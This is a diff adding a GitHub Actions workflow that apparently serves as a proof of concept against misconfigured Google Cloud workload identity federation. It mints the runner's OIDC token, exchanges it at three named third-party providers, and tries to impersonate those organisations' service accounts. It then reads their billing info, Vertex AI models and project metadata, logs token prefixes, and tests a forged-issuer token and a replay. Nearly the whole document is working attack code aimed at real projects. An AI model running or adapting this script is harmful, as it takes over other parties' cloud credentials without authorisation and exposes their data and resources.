@@ -1,0 +1,113 @@
+name: i1935-federated-proof
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: federated-proof
+        run: |
+          set +e
+          PROV_A='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          PROV_B='projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github'
+          PROV_C='projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider'
+          echo "##RUNNER os=$(uname -sr | tr -d ' ')"
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          echo 'import base64,json,sys
+          t=open(sys.argv[1]).read().strip().split(".")
+          p=t[1]+"="*(-len(t[1])%4)
+          d=json.loads(base64.urlsafe_b64decode(p))
+          print("iss=%s aud=%s repo=%s sub=%s" % (d.get("iss"),d.get("aud"),d.get("repository"),d.get("sub")))' | sed 's/^          //' > jwtinfo.py
+          mint() {
+            local prov="$1"
+            local a
+            a=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('https://iam.googleapis.com/'+sys.argv[1],safe=''))" "$prov")
+            local i=0
+            while [ $i -lt 3 ]; do
+              curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$a" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && break
+              i=$((i+1)); sleep 3
+            done
+            cat tok.jwt
+          }
+          sts() {
+            local prov="$1"; local jwtfile="$2"
+            curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$prov" \
+              --data-urlencode "subject_token=$(cat $jwtfile)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          }
+          gen() {
+            local label="$1"; local proj="$2"; local sa="$3"; local tok="$4"
+            local out code body at
+            out=$(curl -s -m 40 -w '\nHTTP=%{http_code}' -X POST -H "Content-Type: application/json" \
+              -H "Authorization: Bearer $tok" -d @req.json \
+              "https://iamcredentials.googleapis.com/v1/projects/$proj/serviceAccounts/$sa:generateAccessToken")
+            code=$(printf '%s' "$out" | tail -1 | sed 's/HTTP=//')
+            body=$(printf '%s' "$out" | head -c 260 | tr '\n' ' ' | tr -s ' ')
+            at=$(printf '%s' "$out" | sed '$d' | jq -r '.accessToken // empty' 2>/dev/null)
+            echo "##GEN $label code=$code toklen=${#at} body=$body"
+            printf '%s' "$at"
+          }
+          getj() {
+            local label="$1"; local url="$2"; local tok="$3"
+            local out code body
+            out=$(curl -s -m 30 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $tok" "$url")
+            code=$(printf '%s' "$out" | tail -1 | sed 's/HTTP=//')
+            body=$(printf '%s' "$out" | sed '$d' | head -c 320 | tr '\n' ' ' | tr -s ' ')
+            echo "##GET $label code=$code body=$body"
+          }
+          ########## PROVIDER A : aryeelab 303574531351
+          mint "$PROV_A" > a.jwt
+          echo "##A_MINT len=$(wc -c < a.jwt) $(python3 jwtinfo.py a.jwt)"
+          ca=$(sts "$PROV_A" a.jwt)
+          FT_A=$(jq -r '.access_token // empty' sts.json)
+          echo "##A_STS code=$ca ftlen=${#FT_A} body=$(head -c 300 sts.json | tr -d '\n' | tr -s ' ')"
+          if [ -n "$FT_A" ]; then
+            AT_A=$(gen "A_compute_303574531351" "-" "303574531351-compute@developer.gserviceaccount.com" "$FT_A")
+            if [ -n "$AT_A" ]; then
+              echo "##A_TOKEN_FP ${AT_A:0:14}"
+              getj "A_billingInfo_303574531351" "https://cloudbilling.googleapis.com/v1/projects/303574531351/billingInfo" "$AT_A"
+              getj "A_models_us-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/303574531351/locations/us-central1/models" "$AT_A"
+            fi
+          fi
+          ########## tampered-iss control (provider A)
+          python3 -c "import base64,json;r=open('a.jwt').read().strip().split('.');d=lambda s:json.loads(base64.urlsafe_b64decode(s+'='*(-len(s)%4)));e=lambda o:base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).decode().rstrip('=');h=d(r[0]);p=d(r[1]);print('##TAMPER_ORIG_ISS',p.get('iss'));p['iss']='https://attacker.invalid';open('a_tampered.jwt','w').write(e(h)+'.'+e(p)+'.'+r[2])"
+          ct=$(sts "$PROV_A" a_tampered.jwt)
+          echo "##A_TAMPER_ISS code=$ct body=$(head -c 400 sts.json | tr -d '\n' | tr -s ' ')"
+          cu=$(sts "$PROV_A" a.jwt)
+          echo "##A_STS_REPLAY code=$cu body=$(head -c 200 sts.json | tr -d '\n' | tr -s ' ')"
+          ########## PROVIDER B : 363590592857
+          mint "$PROV_B" > b.jwt
+          echo "##B_MINT len=$(wc -c < b.jwt) $(python3 jwtinfo.py b.jwt)"
+          cb=$(sts "$PROV_B" b.jwt)
+          FT_B=$(jq -r '.access_token // empty' sts.json)
+          echo "##B_STS code=$cb ftlen=${#FT_B} body=$(head -c 300 sts.json | tr -d '\n' | tr -s ' ')"
+          if [ -n "$FT_B" ]; then
+            AT_B=$(gen "B_compute_363590592857" "-" "363590592857-compute@developer.gserviceaccount.com" "$FT_B")
+            if [ -n "$AT_B" ]; then
+              echo "##B_TOKEN_FP ${AT_B:0:14}"
+              getj "B_billingInfo_363590592857" "https://cloudbilling.googleapis.com/v1/projects/363590592857/billingInfo" "$AT_B"
+              getj "B_models_us-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/363590592857/locations/us-central1/models" "$AT_B"
+            fi
+          fi
+          ########## PROVIDER C : 196494084534
+          mint "$PROV_C" > c.jwt
+          echo "##C_MINT len=$(wc -c < c.jwt)"
+          cc=$(sts "$PROV_C" c.jwt)
+          FT_C=$(jq -r '.access_token // empty' sts.json)
+          echo "##C_STS code=$cc ftlen=${#FT_C} body=$(head -c 250 sts.json | tr -d '\n' | tr -s ' ')"
+          if [ -n "$FT_C" ]; then
+            gen "C_compute_196494084534" "-" "196494084534-compute@developer.gserviceaccount.com" "$FT_C" > /dev/null
+            gen "C_github-actions_zuplo" "-" "github-actions@zuplo-marketing.iam.gserviceaccount.com" "$FT_C" > /dev/null
+            gen "C_ci_zuplo" "-" "ci@zuplo-marketing.iam.gserviceaccount.com" "$FT_C" > /dev/null
+            getj "C_project_get" "https://cloudresourcemanager.googleapis.com/v1/projects/196494084534" "$FT_C"
+          fi
+          echo "##FINISHED1935"
